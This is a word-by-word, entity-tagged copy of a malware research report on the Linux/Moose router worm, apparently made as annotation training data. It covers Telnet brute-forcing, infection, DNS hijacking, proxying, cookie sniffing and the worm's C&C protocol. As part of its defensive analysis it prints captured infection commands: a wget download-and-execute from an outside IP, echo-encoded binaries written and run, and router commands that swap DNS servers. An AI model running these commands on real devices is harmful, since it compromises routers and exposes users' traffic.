port O
. O

Here O
is O
an O
example O
that O
was O
captured O
. O

Server O
headers O
The O
server O
headers O
here O
are O
interesting O
. O

This O
Apache O
server O
version O
hasn't O
been O
released O
( O
and O
probably O
wo O
n't O
be O
for O
another O
century O
) O
. O

Furthermore O
, O
to O
the O
best O
of O
our O
knowledge O
, O
Redhat O
has O
never O
been O
capitalized O
" O
RedHat O
" O
in O
Apache O
Server O
headers O
. O

These O
leads O
us O
to O
think O
that O
what O
we O
have O
here O
is O
a O
custom O
server O
that O
is O
intended O
to O
behave O
like O
an O
HTTP O
server O
when O
sent O
anything O
that O
looks O
like O
GET O
/xx/6 O
. O

There O
are O
three O
fields O
of O
interest O
here O
. O

They O
are O
the O
fields O
set O
in O
the O
format O
string O
used O
by O
the O
malware O
. O

GET O
/xx O
/ O
rnde.php?p=%d&f=%d&m=%d O
HTTP/1.1\r\n O
Host O
: O
www.getcool.com\r\n O
Connection O
: O
Keep O
- O
Alive\r\n O
\r\n O
Note O
The O
www.getcool.com O
hostname O
is O
unrelated O
and O
an O
attempt O
to O
mislead O
analysis O
. O

The O
three O
decimal O
format O
placeholders O
( O
% O
d O
) O
depicted O
above O
are O
. O

The O
IP O
address O
is O
lightly O
obfuscated O
by O
being O
XORed O
with O
a O
fixed O
key O
and O
can O
be O
decrypted O
using O
the O
following O
Python O
snippet O
( O
where O
p O
is O
the O
p O
parameter O
of O
the O
GET O
) O
. O

Back O
to O
the O
scanner O
thread O
description O
: O
if O
there O
is O
no O
connection O
possible O
to O
TCP O
port O
10073 O
( O
no O
proper O
handshake O
) O
it O
tries O
to O
connect O
to O
the O
Telnet O
service O
of O
that O
IP O
( O
TCP O
port O
23 O
) O
. O

It B-Entity
will O
attempt O
to O
bruteforce B-Action
the O
login B-Entity
prompt I-Entity
( O
if O
any O
) O
with B-Modifier
a O
username B-Entity
and I-Entity
password I-Entity
combination I-Entity
list I-Entity
it I-Entity
received I-Entity
from I-Entity
the I-Entity
configuration I-Entity
C&C I-Entity
server I-Entity
. O

On O
a O
successful O
guess O
, O
it B-Entity
will O
report B-Action
the O
intrusion B-Entity
to B-Modifier
the O
report B-Entity
C&C I-Entity
server I-Entity
, O
then O
attempt O
to O
get O
a O
command O
prompt O
on O
the O
device O
. O

Otherwise O
it O
will O
move O
on O
to O
the O
next O
IP O
address O
. O

The O
Moose O
is O
In O
- O
Telnet O
Access O
The O
packet O
to O
report O
a O
successful O
connection O
has O
the O
following O
format O
. O

Byte O
ordering O
Unless O
otherwise O
noted O
, O
all O
the O
network O
protocol O
's O
Integers O
are O
stored O
in O
little O
- O
endian O
byte O
ordering O
, O
except O
for O
IP O
addresses O
, O
which O
are O
stored O
their O
native O
network O
order O
( O
big O
- O
endian O
) O
. O

The O
reply O
from O
the O
server O
is O
the O
same O
packet O
with O
the O
version O
field O
repurposed O
. O

Infection O
mechanism O
After O
a O
successful O
Telnet O
login O
, O
the O
infection O
process O
will O
start O
. O

It O
can O
be O
roughly O
summarized O
with O
the O
diagram O
and O
the O
steps O
below O
. O

The O
commands O
are O
usually O
a O
" O
download O
and O
execute O
" O
procedure O
. O

Depending O
on O
the O
victim O
's O
output O
the O
steps O
will O
be O
repeated O
until O
a O
" O
Status O
OK O
" O
string O
is O
received O
from O
the O
victim O
- O
meaning O
the O
malware O
was O
installed O
and O
started O
- O
or O
the O
report O
C&C O
server O
stops O
sending O
commands O
. O

If O
you O
are O
interested O
in O
the O
details O
, O
read O
- O
on O
, O
otherwise O
feel O
free O
to O
skip O
to O
the O
next O
section O
. O

First O
stage O
After O
the O
C&C O
reply O
, O
Moose B-Entity
continues O
with O
infection O
, O
executing B-Action
commands B-Entity
on B-Modifier
the O
victim B-Entity
device I-Entity
. O

Here O
is O
captured O
interaction O
of O
the O
successful O
first O
stage O
of O
the O
infection O
process O
performed O
by O
the O
scanning O
worm O
. O

Note O
that O
this O
is O
all O
automated O
and O
not O
performed O
interactively O
by O
the O
operator O
. O

> O
sh O
BusyBox O
v1.00 O
( O
2013.12.12 O
- O
03:56 O
+ O
0000 O
) O
Built O
- O
in O
shell O
( O
msh O
) O
Enter O
' O
help O
' O
for O
a O
list O
of O
built O
- O
in O
commands O
. O

# O
ps O
PID O
Uid O
VmSize O
Stat O
Command O
1 O
admin O
468 O
S O
init O
[ O
... O
] O
# O
echo O
-n O
-e O
" O
H3lL0WoRlD O
" O
H3lL0WoRlD O
# O
chmod O
BusyBox O
v1.00 O
( O
2013.12.12 O
- O
03:56 O
+ O
0000 O
) O
multi O
- O
call O
binary O
Usage O
: O
chmod O
[ O
-R O
] O
MODE[,MODE O
] O
... O

FILE O
... O

Each O
MODE O
is O
one O
or O
more O
of O
the O
letters O
ugoa O
, O
one O
of O
the O
symbols O
+ O
-= O
and O
one O
or O
more O
of O
the O
letters O
rwxst O
. O

Options O
: O
-R O
Changes O
files O
and O
directories O
recursively O
. O

# O
cat O
/proc O
/ O
cpuinfo O
[ O
... O
] O
system O
type O
: O
MIPS O
Malta O
processor O
: O
0 O
cpu O
model O
: O
MIPS O
24Kc O
V0.0 O
FPU O
V0.0 O
[ O
... O
] O
A O
couple O
of O
things O
are O
done O
here O
. O

At O
this O
point O
, O
Moose B-Entity
has O
not O
yet O
infected O
its O
new O
victim O
. O

It B-Entity
will O
then O
send B-Action
a O
message B-Entity
to B-Modifier
the O
report B-Entity
C&C I-Entity
server I-Entity
with B-Modifier
what O
it B-Entity
has I-Entity
learned I-Entity
so I-Entity
far I-Entity
about I-Entity
the I-Entity
target I-Entity
victim I-Entity
. O

Bit O
field O
about O
the O
infection O
state O
The B-Entity
report I-Entity
C&C I-Entity
server I-Entity
responds B-Action
with B-Modifier
obfuscated O
commands B-Entity
to I-Entity
execute I-Entity
on I-Entity
the I-Entity
victim I-Entity
. O

Second O
stage O
We O
now O
enter O
the O
second O
stage O
of O
infection O
. O

Each O
command O
is O
decrypted O
and O
executed O
on O
the O
victim O
via O
Telnet O
. O

Typically O
, O
this O
consists O
of O
a O
download O
and O
execute O
but O
the O
architecture O
is O
flexible O
and O
would O
allow O
any O
arbitrary O
commands O
to O
be O
executed O
. O

We O
've O
witnessed O
two O
main O
class O
of O
commands O
sent O
to O
perform O
the O
infection O
. O

The O
first O
one O
is O
a O
classic O
download O
and O
execute O
using O
wget O
. O

# O
cd O
/var O
# O
rm O
./elan2 O
rm O
: O
can O
not O
remove O
' O
./elan2 O
' O
: O
No O
such O
file O
or O
directory O
# O
wget O
http://77.247.177.36:81/xx/atheros_mips/elan2 O
Connecting O
to O
77.247.177.36[77.247.177.36]:81 O
200 O
OK O
, O
File O
Get O
Success O
# O
chmod O
+ O
x O
./elan2 O
# O
./elan2 O
Sys O
init O
: O
OK O
Status O
: O
OK O
The O
second O
technique O
is O
encoding O
the O
binary O
into O
several O
echo O
commands O
that O
are O
executed O
on O
the O
victim O
and O
redirecting O
output O
into O
a O
file O
that O
is O
later O
executed O
. O

# O
cp O
/bin O
/ O
ls O
/dev O
/ O
elan2 O
# O
echo O
-n O
-e O
" O
\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\ O
> O
\x02\x00\x28\x00\x01\x00\x00\x00\x90\x81\x00\x00\x34\x00\x00\x00\xb4\xe9\x01\ O
> O
\x00\x02\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x0d\x00 O
" O
> O
/dev O
/ O
elan2 O
# O
echo O
-n O
-e O
" O
\x9d\xe8\xbc\x1d\x03\x00\x44\x90\x02\x00\x94\xd8\x02\x00\xa4\x1d\ O
> O
\x03\x00\x0d\xc0\xa0\xe1\x00\xd8\x2d\xe9\x04\xb0\x4c\xe2\xa4\xd0\x4d\xe2\xa8\ O
> O
\x00\x0b\xe5\x01\x30\xa0\xe1\xac\x30\x4b\xe5\x01\x30\xa0\xe3 O
" O
> O
> O
/dev O
/ O
elan2 O
... O

# O
echo O
-n O
-e O
" O
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\xe9\x01\x00\x56\x00\ O
> O
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00 O
" O
> O
> O
/ O
dev O
/ O
elan2 O
# O
chmod O
+ O
x O
/dev O
/ O
elan2 O
# O
/dev O
/ O
elan2 O
Sys O
init O
: O
OK O
Status O
: O
OK O
No O
matter O
the O
method O
, O
by O
that O
point O
the O
victim O
has O
been O
infected O
: O
it B-Entity
will O
reach B-Action
the O
configuration B-Entity
C&C I-Entity
server I-Entity
, O
obtain B-Action
its O
configuration B-Entity
parameters I-Entity
, O
and O
start O
its O
nefarious O
activities O
. O

This O
two O
- O
stage O
mechanism O
allows O
for O
the O
report O
C&C O
server O
to O
specify O
a O
URL O
to O
an O
ELF O
binary O
that O
will O
match O
the O
architecture O
and O
environment O
found O
by O
the O
various O
checks O
it O
performed O
. O

Plus O
, O
it O
enables O
the O
operators O
to O
add O
support O
for O
new O
target O
platforms O
without O
having O
to O
upgrade O
their O
botnet O
- O
but O
only O
their O
distribution O
methods O
on O
the O
report O
C&C O
server O
. O

Moose O
's O
Excentricity O
- O
Optional O
Behaviors O
We O
just O
described O
the O
most O
common O
scanning O
behavior O
, O
but O
its O
configuration O
can O
alter O
how O
it O
is O
performed O
. O

Here O
a O
summary O
of O
some O
of O
those O
configuration O
flags O
and O
their O
effects O
. O

Moose O
Grand O
Theft O
Auto O
- O
DNS O
Hijacking O
Lastly O
three O
parameters O
require O
more O
explanation O
cnccfg_flag_hijackdns O
, O
cnccfg_hijackdns1_ip O
and O
cnccfg_hijackdns2_ip O
. O

If O
the O
first O
parameter O
is O
enabled O
, O
it O
will O
run O
the O
following O
commands O
on O
the O
Telnet O
console O
before O
trying O
to O
obtain O
a O
shell O
. O

The O
% O
s O
% O
s O
is O
replaced O
with O
the O
two O
DNS O
IP O
addresses O
provided O
in O
the O
configuration O
. O

What O
is O
DNS O
Hijacking O
? O
DNS O
Hijacking O
consists O
of O
changing O
the O
DNS O
servers O
used O
by O
a O
victim O
in O
order O
to O
perform O
other O
attacks O
like O
phishing O
or O
man O
- O
in O
- O
the O
- O
middle O
. O

DNS O
servers O
do O
the O
domain O
name O
to O
IP O
address O
translation O
. O

A O
malicious O
DNS O
server O
can O
change O
( O
or O
hijack O
) O
that O
translation O
so O
that O
any O
legitimate O
domain O
name O
will O
resolve O
to O
an O
IP O
address O
of O
the O
attackers O
' O
choice O
. O

This O
means O
that O
traffic B-Entity
intended I-Entity
for I-Entity
a I-Entity
certain I-Entity
specified I-Entity
address I-Entity
may O
be O
redirected B-Action
to B-Modifier
another O
, B-Entity
entirely I-Entity
unrelated I-Entity
address I-Entity
. O

set O
lan O
dhcp O
server O
set O
lan O
dhcpdns O
% O
s O
% O
s O
dns O
config O
static O
% O
s O
% O
s O
save O
The O
code O
attempts O
to O
replace O
the O
legitimate O
DNS O
servers O
used O
by O
the O
target O
router O
with O
malicious O
servers O
. O

However O
there O
are O
a O
lot O
of O
different O
text O
- O
based O
user O
interfaces O
for O
such O
devices O
. O

This O
probably O
explains O
why O
it O
is O
attempting O
to O
do O
so O
using O
more O
than O
one O
method O
. O

Quick O
googling O
reveals O
that O
at O
least O
some O
of O
TP O
- O
Link O
, O
Zyxel O
, O
Zhone O
and O
Netgear O
models O
support O
one O
of O
these O
commands O
. O

The O
code O
is O
not O
concerned O
with O
error O
- O
handling O
, O
it O
will O
resume O
execution O
after O
the O
DNS O
hijacking O
attempt O
regardless O
of O
any O
errors O
encountered O
. O

This O
method O
of O
scanning O
is O
a O
straightforward O
yet O
effective O
way O
of O
finding O
new O
targets O
to O
copromise O
. O

Going O
for O
IP O
addresses O
nearby O
is O
clever O
and O
probably O
yields O
to O
higher O
infection O
rate O
because O
it O
might O
be O
scanning O
past O
firewalls O
as O
we O
will O
cover O
in O
the O
next O
section O
. O

One O
of O
the O
most O
interesting O
aspects O
of O
this O
threat O
is O
its O
ability O
to O
go O
deep O
inside O
networks O
, O
trying O
hard O
to O
spread O
past O
firewalls O
. O

Two O
different O
mechanisms O
will O
be O
at O
play O
here O
: O
first O
, O
a O
spreading O
mechanism O
that O
understands O
the O
realities O
of O
large O
network O
firewall O
configurations O
and O
second O
, O
support O
for O
custom O
NAT O
traversal O
. O

This O
section O
will O
describe O
both O
behaviors O
. O

Scanning O
close O
to O
home O
As O
we O
mentioned O
earlier O
, O
the B-Entity
configuration I-Entity
C&C I-Entity
server I-Entity
returns B-Action
the O
public B-Entity
IP I-Entity
address I-Entity
it I-Entity
saw I-Entity
when B-Modifier
it O
was B-Entity
contacted I-Entity
by I-Entity
the I-Entity
infected I-Entity
router I-Entity
. O

This O
IP O
address O
is O
then O
used O
as O
a O
basis O
for O
near O
- O
home O
scanning O
on O
the O
Telnet O
port O
. O

The O
IP O
addresses O
reached O
this O
way O
are O
random O
, O
but O
all O
inside O
the O
same O
/15 O
network O
of O
the O
infected O
router O
's O
public O
IP O
. O

This B-Entity
can O
effectively O
bypass B-Action
firewalls O
on B-Entity
the I-Entity
perimeter I-Entity
and O
allow O
the O
worm O
to O
spread O
further O
copies O
of O
itself O
. O

The O
above O
diagram O
illustrates O
why O
the O
operators O
focus O
more O
on O
the O
near O
home O
scanning O
. O

Black O
lines O
represent O
network O
connectivity O
and O
yellow O
arrows O
represent O
network O
interactions O
. O

Here O
we O
highlighted O
. O

During O
our O
monitoring O
of O
an O
infected O
device O
we O
saw O
that O
Telnet O
access O
was O
3 O
times O
more O
successful O
when O
scanning O
for O
near O
- O
home O
IP O
addresses O
than O
when O
scanning O
random O
IP O
addresses O
on O
the O
Internet O
. O

We O
think O
this O
difference O
is O
explained O
by O
NAT O
and O
misconfigured O
firewalls O
. O

This O
does O
n't O
surprise O
us O
given O
the O
complexity O
of O
modern O
networks O
and O
the O
amount O
of O
firewall O
rules O
they O
need O
. O

Furthermore O
, O
a O
study O
of O
firewall O
rules O
by O
Avishai O
Wool O
demonstrated O
a O
correlation O
between O
the O
complexity O
and O
volume O
of O
firewall O
rules O
and O
the O
number O
of O
errors O
made O
in O
their O
configuration O
- O
badly O
locked- O
down O
Telnet O
access O
being O
one O
of O
the O
errors O
mentioned O
in O
the O
study O
. O

Additionally O
, O
the O
worm O
will O
launch O
an O
extra O
scanner O
thread O
per O
IP O
interface O
present O
on O
the O
system O
, O
carefully O
avoiding O
/32 O
IPs O
( O
IP O
aliases O
) O
and O
loopback O
interfaces O
( O
like O
127.0.0.1 O
) O
. O

This O
enables O
the B-Entity
worm I-Entity
to O
spread B-Action
inside B-Modifier
Local O
Area B-Entity
Networks I-Entity
( I-Entity
LANs I-Entity
) I-Entity
that I-Entity
are I-Entity
not I-Entity
normally I-Entity
accessible I-Entity
from I-Entity
the I-Entity
Internet I-Entity
due I-Entity
to I-Entity
the I-Entity
use I-Entity
of I-Entity
firewalls I-Entity
and I-Entity
network I-Entity
address I-Entity
translation I-Entity
( I-Entity
NAT I-Entity
) I-Entity
. O

On O
successful O
infection O
, O
the O
newly O
- O
compromised O
machine O
will O
spawn O
scanners O
on O
its O
own O
internal O
IP O
interfaces O
and O
thus O
go O
deeper O
inside O
the O
private O
network O
. O

This O
type O
of O
automated O
network O
pivoting O
is O
very O
interesting O
for O
a O
couple O
of O
reasons O
. O

Another O
interesting O
capability O
related O
to O
network O
penetration O
is O
the O
custom O
NAT O
traversal O
implementation O
. O

It O
could O
be O
categorized O
as O
a O
simple O
implementation O
of O
the O
concepts O
behind O
the O
Session O
Traversal O
Utilities O
for O
NAT O
( O
STUN O
) O
and O
Traversal O
Using O
Relays O
around O
NAT O
( O
TURN O
) O
standards O
. O

The O
configuration O
given O
by O
the O
configuration O
C&C O
server O
to O
the O
infected O
host O
provides O
both O
its O
public O
IP O
address O
and O
the O
address O
of O
a O
system O
that O
is O
going O
to O
be O
used O
as O
a O
relay O
( O
relay O
C&C O
server O
) O
. O

During O
our O
analysis O
of O
the O
threat O
the O
relay O
C&C O
IP O
address O
was O
always O
the O
same O
: O
93.190.140.221 O
. O

The O
configuration O
values O
affecting O
the O
behavior O
of O
the O
NAT O
traversal O
are O
the O
following O
. O

We O
will O
explain O
where O
these O
values O
come O
from O
when O
we O
will O
describe O
the O
configuration O
C&C O
network O
protocol O
further O
along O
. O

If O
NAT O
traversal O
is O
enabled O
, O
two O
threads O
are O
created O
at O
start O
- O
up O
that O
are O
dedicated O
to O
reach O
the O
relay O
C&C O
server O
. O

The O
relay O
is O
queried O
at O
short O
intervals O
( O
defined O
by O
cnccfg_relaycnc_sleep O
) O
for O
anything O
to O
proxy O
through O
the O
infected O
host O
. O

The O
server O
replies O
either O
with O
one O
IP O
address O
and O
port O
( O
for O
outreach O
) O
or O
multiple O
pairs O
of O
IP O
addresses O
and O
ports O
( O
for O
relay O
) O
. O

First O
the O
infected O
device O
reaches O
out O
to O
the O
relay O
with O
this O
hardcoded O
packet O
. O

18 O
00 O
00 O
00 O
The O
server O
responds O
with O
the O
following O
structure O
. O

For O
example O
. O

00 O
00 O
00 O
50 O
c0 O
a8 O
01 O
01 O
\-1-/ O
\-2-/ O
\----3 O
- O
---/ O
The O
infected O
host O
will O
then O
connect O
on O
the O
tunnel O
destination O
it O
has O
received O
. O

Upon O
successful O
connection O
, O
it O
will O
hand O
over O
the O
two O
sockets O
to O
a O
thread O
dedicated O
to O
move O
the O
data O
back O
and O
forth O
between O
the O
tunnel O
destination O
and O
the O
relay O
C&C O
server O
. O

This O
way O
, O
even O
if O
a O
host O
is O
unreachable O
from O
the O
Internet O
because O
of O
firewalls O
or O
NAT O
, O
the O
operators O
can O
still O
use O
the O
infected O
host O
. O

During O
our O
monitoring O
of O
the O
threat O
, O
we O
saw O
tunnels O
being O
made O
to O
reach O
social O
networks O
. O

However O
, O
most O
of O
the O
time O
, O
the O
server O
was O
seen O
to O
respond O
with O
a O
TCP O
reset O
( O
RST O
) O
and O
sometimes O
sleep O
commands O
. O

One O
of O
the O
first O
thing O
Linux B-Entity
/ I-Entity
Moose I-Entity
does O
is O
to O
start O
listening B-Action
on B-Modifier
TCP O
port B-Entity
10073 I-Entity
for B-Modifier
incoming O
connections B-Entity
. O

As O
was O
previously O
discussed O
, O
this B-Entity
server I-Entity
is O
used B-Action
by O
the B-Entity
bot I-Entity
to B-Modifier
assess O
whether B-Entity
a I-Entity
system I-Entity
is I-Entity
infected I-Entity
. O

When O
some B-Entity
Linux I-Entity
/ I-Entity
Moose I-Entity
scanner I-Entity
thread I-Entity
reaches I-Entity
an I-Entity
opened I-Entity
10073 I-Entity
port I-Entity
, O
it B-Entity
will O
result B-Action
in B-Modifier
a O
TCP B-Entity
handshake I-Entity
without B-Modifier
a O
data B-Entity
payload I-Entity
. O

However O
when O
we O
look O
at O
the O
code O
, O
we O
find O
that O
a O
limited O
number O
of O
IP O
addresses O
are O
allowed O
through O
. O

The O
is_in_whitelist O
function O
makes O
sure O
that O
the O
source O
IP O
address O
of O
the O
connection O
is O
in O
a O
list O
of O
IP O
address O
given O
by O
the O
configuration O
C&C O
server O
earlier O
. O

If O
it O
is O
, O
then O
the O
socket O
and O
some O
configuration O
is O
passed O
to O
a O
thread O
that O
will O
handle O
the O
connection O
. O

Note O
The O
whitelist O
These O
are O
the O
only O
IP O
addresses O
allowed O
to O
interact O
with O
the O
malware O
. O

According O
to O
our O
monitoring O
, O
the O
addresses O
in O
the O
list O
haven't O
changed O
in O
months O
but O
it O
will O
likely O
be O
modified O
after O
the O
operators O
become O
aware O
of O
this O
report O
. O

These O
servers O
could O
be O
either O
operator O
- O
owned O
or O
compromised O
. O

The O
current O
whitelist O
of O
IP O
addresses O
is O
available O
in O
the O
appendix O
sections O
under O
Indicators O
of O
Compromise O
( O
IOC O
) O
. O

The O
presence O
of O
a O
whitelist O
and O
the O
fallback O
behavior O
of O
closing O
the O
socket O
after O
a O
successful O
TCP O
handshake O
implies O
that O
we O
ca O
n't O
enumerate O
infected O
hosts O
by O
scanning O
the O
whole O
Internet O
on O
port O
10073 O
. O

Proxy O
Server O
Worker O
The O
proxy O
server O
worker O
thread O
processes O
the O
connection O
from O
a O
whitelisted O
IP O
address O
. O

Upon O
connection O
the O
server O
will O
read O
a O
single O
byte O
. O

Depending O
on O
that O
command O
byte O
, O
one O
of O
four O
things O
can O
happen O
. O

These O
are O
all O
classic O
protocols O
to O
use O
when O
one O
wants O
to O
have O
Internet O
traffic O
appear O
as O
if O
it O
was O
originating O
from O
the O
infected O
device O
. O

The O
worm O
uses O
this O
approach O
to O
leverage O
the O
good O
IP O
address O
reputation O
of O
big O
internet O
service O
providers O
( O
ISP O
) O
clients O
with O
regards O
to O
casual O
browsing O
like O
viewing O
ads O
, O
send O
emails O
or O
interact O
with O
social O
networks O
. O

Doing O
any O
of O
these O
activities O
in O
bulk O
from O
a O
few O
data O
- O
center O
IP O
addresses O
would O
draw O
unwanted O
attention O
. O

The O
implementation O
of O
the O
SOCKS O
4 O
proxy O
is O
according O
to O
specifications O
. O

It O
enables O
the O
establishment O
of O
a O
TCP O
tunnel O
from O
the O
infected O
server O
to O
a O
host O
specified O
by O
the O
connecting O
party O
. O

After O
the O
initial O
handshake O
, O
traffic B-Entity
is O
sent B-Action
transparently O
back O
and O
forth O
between B-Modifier
the O
client B-Entity
of I-Entity
the I-Entity
infected I-Entity
service I-Entity
and I-Entity
the I-Entity
specified I-Entity
host I-Entity
. O

Here O
you O
can O
see O
the O
SOCKS O
exchange O
( O
1 O
) O
with O
the O
tunnel O
destination O
information O
. O

Once O
the O
infected O
host O
replied O
that O
the O
connection O
is O
successful O
( O
0x5a O
) O
then O
the O
client O
( O
botnet O
operator O
) O
sends O
its O
HTTP O
request O
( O
2 O
) O
to O
have O
it O
proxied O
through O
the O
infected O
machine O
. O

The O
infected O
host O
will O
finally O
return O
the O
response O
it O
received O
from O
the O
tunnel O
destination O
( O
3 O
) O
. O

In O
this O
case O
, O
it O
is O
a O
request O
to O
upgrade O
to O
HTTPS O
via O
a O
Location O
header O
. O

This O
has O
been O
by O
far O
the O
most O
active O
protocol O
while O
we O
have O
been O
monitoring O
. O

Very O
similar O
to O
SOCKS O
4 O
, O
SOCKS O
5 O
is O
a O
protocol O
to O
allow O
TCP O
tunnels O
to O
be O
created O
between O
the O
server O
's O
client O
and O
an O
arbitrary O
host O
. O

The O
malware O
's O
implementation O
is O
incomplete O
and O
only O
supports O
the O
" O
No O
authentication O
" O
authentication O
method O
. O

This O
partial O
support O
is O
likely O
to O
be O
enough O
for O
the O
operators O
since O
they O
already O
have O
the O
whitelist O
mechanism O
in O
place O
to O
prevent O
unwanted O
hosts O
from O
accessing O
the O
malware O
. O

We O
believe O
it O
was O
implemented O
in O
order O
to O
support O
a O
maximum O
number O
of O
client O
applications O
. O

HTTP O
Proxy O
The O
HTTP O
proxy O
is O
a O
basic O
yet O
complete O
HTTP/1.1 O
proxy O
. O

It O
looks O
at O
the O
HTTP O
headers O
, O
resolves O
the O
destination O
host O
, O
connects O
to O
it O
and O
sends O
the O
data O
back O
to O
the O
client O
. O

It O
will O
also O
honor O
the O
CONNECT O
method O
if O
it O
is O
present O
enabling O
HTTPS O
to O
be O
proxied O
through O
. O

Whichever O
proxy O
technique O
is O
used O
, O
anything O
that O
tries O
to O
deal O
with O
destination O
TCP O
ports O
25 O
( O
SMTP O
) O
, O
465 O
( O
STMPS O
) O
or O
587 O
( O
Submission O
) O
will O
require O
a O
special O
flag O
to O
be O
set O
in O
the O
whitelist O
configuration O
sent O
by O
the O
configuration O
C&C O
server O
. O

Most O
of O
the O
whitelisted O
server O
have O
this O
flag O
turned O
off O
. O

The O
mechanisms O
described O
above O
allow O
the O
botnet O
operator O
to O
leverage O
the O
good O
IP O
reputation O
of O
the O
infected O
devices O
in O
a O
very O
lightweight O
, O
flexible O
and O
inconspicuous O
manner O
. O

Linux O
/ B-Entity
Moose I-Entity
is O
able O
to O
eavesdrop B-Action
on B-Modifier
traffic O
going B-Entity
through I-Entity
affected I-Entity
devices I-Entity
. O

This O
is O
a O
particularly O
interesting O
capability O
considering O
that O
routers O
are O
often O
forward O
all O
sorts O
of O
traffic O
. O

This O
section O
will O
describe O
this O
behavior O
. O

Enabling O
, O
this O
functionality O
requires O
two O
different O
configuration O
flags O
to O
be O
set O
: O
cnccfg_flag O
_ O
scanner_sniffer O
and O
cnccfg_flag_thd_sniffer O
. O

When O
set O
, O
these O
will O
spawn O
a O
sniffer O
thread O
on O
all O
non O
- O
loopback O
interfaces O
that O
have O
received O
at O
least O
101 O
packets O
. O

This O
check O
is O
done O
in O
order O
to O
avoid O
creating O
threads O
for O
interfaces O
that O
will O
not O
carry O
potentially O
interesting O
traffic O
. O

The O
thread O
dedicated O
to O
eavesdropping O
is O
rather O
simple O
. O

It B-Entity
creates B-Action
a O
raw B-Entity
socket I-Entity
, O
sets O
the O
interface O
in O
promiscuous O
mode O
, O
then O
loops O
on O
a O
recvfrom O
as O
depicted O
below O
. O

In O
order O
to O
avoid O
doing O
too O
much O
work O
, O
only O
TCP O
packets O
are O
inspected O
. O

They O
are O
searched O
for O
strings O
that O
were O
sent O
by O
the O
configuration O
C&C O
server O
as O
snfcfg_<id>_needle O
in O
the O
network O
protocol O
analysis O
detailed O
later O
. O

Currently O
the O
network O
sniffers O
are O
configured O
to O
search O
for O
the O
following O
strings O
. O

As O
previously O
mentioned O
, O
these O
are O
the O
HTTP O
cookies O
used O
by O
popular O
social O
network O
sites O
. O

Once O
a O
match O
is O
found O
, O
the B-Entity
whole I-Entity
packet I-Entity
including I-Entity
its I-Entity
Ethernet I-Entity
, I-Entity
IP I-Entity
, I-Entity
TCP I-Entity
headers I-Entity
and I-Entity
payload I-Entity
is O
sent B-Action
, O
obfuscated O
, O
to B-Modifier
the O
report B-Entity
C&C I-Entity
server I-Entity
. O

The O
exact O
format O
is O
described O
below O
. O

The O
reply O
packet O
is O
. O

This O
mechanism O
is O
very O
interesting O
. O

It O
is O
lightweight O
enough O
to O
run O
on O
small O
embedded O
devices O
and O
yet O
it O
gives O
a O
lot O
of O
contextual O
information O
to O
the O
operators O
to O
do O
all O
sort O
of O
mischief O
by O
stealing O
important O
data O
. O

Moose B-Entity
is O
a O
combative O
animal O
. O

Every O
hour O
, O
it O
goes O
through O
every O
process O
entry O
under O
/proc/<pid>/ O
and O
searches O
thoroughly O
through O
the O
cmdline O
file O
. O

cmdline O
holds O
the O
process O
original O
name O
, O
and O
any O
arguments O
given O
to O
it O
at O
startup O
, O
separated O
by O
null O
bytes O
( O
0x00 O
) O
. O

Going O
through O
this O
list O
, O
it B-Entity
will O
send B-Action
a O
kill B-Entity
signal I-Entity
to B-Modifier
any O
process B-Entity
that I-Entity
matches I-Entity
any I-Entity
of I-Entity
the I-Entity
blacklisted I-Entity
strings I-Entity
. O

This O
blacklist O
, O
as O
opposed O
to O
many O
of O
the O
other O
characteristics O
of O
this O
malware O
, O
is O
hardcoded O
in O
the O
binary O
. O

This O
function O
requires O
a O
configuration O
flag O
to O
be O
set O
: O
cnccfg_flag_killprocess O
. O

During O
our O
monitoring O
of O
the O
threat O
's O
traffic O
this O
flag O
was O
always O
on O
. O

Here O
is O
the O
blacklist O
. O

All O
these O
entries O
are O
related O
to O
digital O
currency O
mining O
operations O
- O
something O
performed O
by O
other O
embedded O
threats O
. O

Killing O
these O
processes O
is O
probably O
done O
to O
make O
sure O
that O
all O
of O
the O
limited O
resources O
of O
the O
system O
are O
available O
to O
Linux O
/ O
Moose O
. O

The O
cmd.so O
string O
seems O
specific O
to O
the O
Synology O
Disk O
Miner O
. O

/.usb2 O
, O
/.scan O
and O
./ipt O
all O
lead O
to O
the O
same O
ARM O
Linux O
miner O
worm O
. O

Most O
of O
these O
other O
worms O
also O
leverage O
weak O
or O
default O
credentials O
, O
so O
it O
makes O
sense O
that O
they O
try O
to O
get O
rid O
of O
each O
other O
. O

We O
are O
giving O
a O
very O
detailed O
description O
of O
the O
network O
protocol O
to O
enable O
affected O
organizations O
to O
apply O
this O
knowledge O
to O
their O
defense O
mechanism O
. O

The O
operators O
of O
Linux O
/ O
Moose O
can O
recompile O
and O
modify O
binaries O
to O
avoid O
detection O
but O
modifying O
their O
network O
protocol O
takes O
more O
time O
, O
which O
is O
why O
we O
share O
this O
information O
in O
the O
hopes O
of O
negatively O
affecting O
their O
operation O
. O

Below O
is O
the O
protocol O
described O
in O
text O
aimed O
at O
describing O
the O
components O
' O
interactions O
. O

To O
deobfuscate O
quickly O
the O
traffic O
that O
was O
captured O
, O
we O
refer O
you O
to O
our O
malware O
- O
research O
repository O
on O
Github O
where O
we O
added O
tshark O
commands O
and O
Python O
code O
to O
see O
the O
traffic O
described O
below O
. O

There O
are O
two O
typical O
exchanges O
with O
the O
configuration O
C&C O
server O
. O

One O
is O
done O
every O
hour O
and O
one O
is O
done O
every O
four O
hours O
. O

The O
only O
difference O
between O
the O
two O
exchanges O
is O
that O
they B-Entity
update B-Action
different O
variables B-Entity
in B-Modifier
the O
client B-Entity
. O

However O
almost O
all B-Entity
of I-Entity
the I-Entity
data I-Entity
is O
still O
sent B-Action
by O
the B-Entity
C&C I-Entity
. O

The O
only O
difference O
is O
that O
the O
username O
and O
password O
list O
used O
for O
bruteforce O
attacks O
is O
omitted O
in O
the O
hourly O
run O
. O

Here O
is O
what O
a O
configuration O
exchange O
with O
the O
configuration O
C&C O
server O
looks O
like O
. O

The O
structure O
of O
the O
data O
sent O
to O
the O
configuration O
C&C O
server O
is O
the O
following O
. O

Bit O
field O
about O
the O
bot O
details O
The B-Entity
server I-Entity
replies B-Action
with B-Modifier
the O
configuration B-Entity
for I-Entity
the I-Entity
malware I-Entity
. O

It O
is O
composed O
of O
independent O
blocks O
of O
configuration O
information O
with O
some O
being O
optional O
. O

The O
high O
- O
level O
